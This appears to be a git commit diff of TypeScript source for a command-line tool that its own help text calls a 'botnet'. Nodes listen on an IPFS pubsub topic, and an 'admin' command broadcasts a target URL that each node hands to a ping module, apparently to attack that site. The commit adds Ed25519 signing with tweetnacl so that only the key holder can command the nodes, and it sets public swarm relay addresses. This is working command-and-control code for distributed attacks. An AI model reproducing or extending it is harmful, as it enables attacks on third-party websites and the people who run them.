de2558731469c5225fe2a2f084522d6360475be4
Aitor Ruiz <aitorruiz2m@gmail.com>
2022-04-21 15:07:49 +0200

    :construction: tweetna-cl and more ipfs addresses

--- src/index.ts
+++ src/index.ts
@@ -1,19 +1,36 @@
-// TODO: Call pbLogic with the topic.
 import args from 'args';
 import pbL, { list_peers, send_next_target } from './pbLogic';
+// IPFS topic
 const TOPIC = 'btnt-ipfs';
+// Create a readline interface
 import readline from 'readline';
 const rl = readline.createInterface({
   input: process.stdin,
   output: process.stdout
 });
-console.log(TOPIC);
+// Load crpto tool tweetna-cl
+import nacl from 'tweetnacl';
+import naclUtil from 'tweetnacl-util';
+// Load fs for key storing
+import fs from 'fs';
+import { exit } from 'process';
 
 const serveCommand = async () => {
+  // Ckeck if key exist
+  if(!fs.existsSync('pbkey.key')){
+    console.error('Key does not exist...');
+    exit(1);
+  }
   await pbL(TOPIC);
 };
 
 const adminCommand = async () => {
+  // Ckeck if key exist
+  if(!fs.existsSync('pbkey.key')){
+    console.error('Key does not exist...');
+    console.log('Please run create command to generate some keys. The botnet must have the same public key.');
+    exit(1);
+  }
   rl.question('Url to target: ', async (url) => {
     await send_next_target(TOPIC, url);
   });
@@ -21,13 +38,24 @@ const adminCommand = async () => {
 const listPeers = async () => {
   await list_peers(TOPIC);
 };
+const createKeys = () => {
+  console.log('Creating keys');
+  // https://github.com/dchest/tweetnacl-js#naclsignkeypair
+  const keypair = nacl.sign.keyPair();
+  // https://github.com/dchest/tweetnacl-util-js#documentation
+  const pbKeyString = naclUtil.encodeBase64(keypair.publicKey);
+  const pvKeyString = naclUtil.encodeBase64(keypair.secretKey);
+  fs.writeFileSync('pbkey.key', pbKeyString);
+  fs.writeFileSync('pvkey.key', pvKeyString);
+  console.log('Keys created');
+  exit(0);
+};
 
 args
   .command('serve', 'Serve the botnet', serveCommand)
   .command('admin', 'Send messages to the pubsub botnet', adminCommand)
-  .command('peers', 'List the peers that are subscribed to the topic', listPeers);
+  .command('peers', 'List the peers that are subscribed to the topic', listPeers)
+  .command('create', 'Create a keys for signing', createKeys);
 
 // Parse cli args 
 args.parse(process.argv);
-
-
--- src/pbLogic.ts
+++ src/pbLogic.ts
@@ -1,5 +1,11 @@
 import * as IPFS from 'ipfs-core';
 import pingL from './pingLogic';
+// Load crpto tool tweetna-cl
+import nacl from 'tweetnacl';
+import naclUtil from 'tweetnacl-util';
+// Load fs for key storing
+import fs from 'fs';
+import { exit } from 'process';
 
 /**
  * Listener logic
@@ -7,18 +13,36 @@ import pingL from './pingLogic';
  */
 export default async function pbL(topic: string) {
   const ipfs = await create_IPFS();
-  const receiveMsg = (msg: { data: BufferSource | undefined; }) => pingL(new TextDecoder().decode(msg.data));
+  const receiveMsg = (msg: { data: BufferSource | undefined; }) => 
+    parse_incoming_text(new TextDecoder().decode(msg.data));
   await ipfs.pubsub.subscribe(topic, receiveMsg);
 }
+
+const parse_incoming_text = (payload:string) => {
+  const signedMessage = naclUtil.decodeBase64(payload);
+  const publicKey = fs.readFileSync('pbkey.key').toString();
+  const messageVerified = nacl.sign.open(
+    signedMessage, 
+    naclUtil.decodeBase64(publicKey)
+  );
+  if (messageVerified !== null) {
+    pingL(naclUtil.encodeBase64(messageVerified));
+  }
+};
 
 /**
  * Send a url to the botnet
  * @param topic The topic witch the message will be sent to
- * @param payload The payload that will get sent
+ * @param payload The payload that will be sent
  */
 const send_next_target = async (topic:string, payload:string) => {
+  const privateKey = fs.readFileSync('pvkey.key').toString();
+  const signedMessage = nacl.sign(
+    naclUtil.decodeUTF8(payload), 
+    naclUtil.decodeBase64(privateKey)
+  );
   const ipfs = await create_IPFS();
-  const msg = new TextEncoder().encode(payload);
+  const msg = new TextEncoder().encode(naclUtil.encodeBase64(signedMessage));
   await ipfs.pubsub.publish(topic, msg);
 };
 
@@ -30,6 +54,7 @@ const list_peers = async (topic:string) => {
   const ipfs = await create_IPFS();
   const peerIds = await ipfs.pubsub.peers(topic);
   console.log(peerIds);
+  exit(0);
 };
 
 /**
@@ -37,7 +62,18 @@ const list_peers = async (topic:string) => {
  * @returns ipfs instance
  */
 const create_IPFS = async () => {
-  const ipfs = await IPFS.create();
+  const ipfs = await IPFS.create({
+    config: {
+      Addresses: {
+        Swarm: [
+          '/dns4/wrtc-star1.par.dwebops.pub/tcp/443/wss/p2p-webrtc-star',
+          '/dns4/wrtc-star2.sjc.dwebops.pub/tcp/443/wss/p2p-webrtc-star',
+          '/ip4/0.0.0.0/tcp/4002',
+          '/ip4/127.0.0.1/tcp/4003/ws'
+        ],
+      }
+    }
+  });
   return ipfs;
 };
 
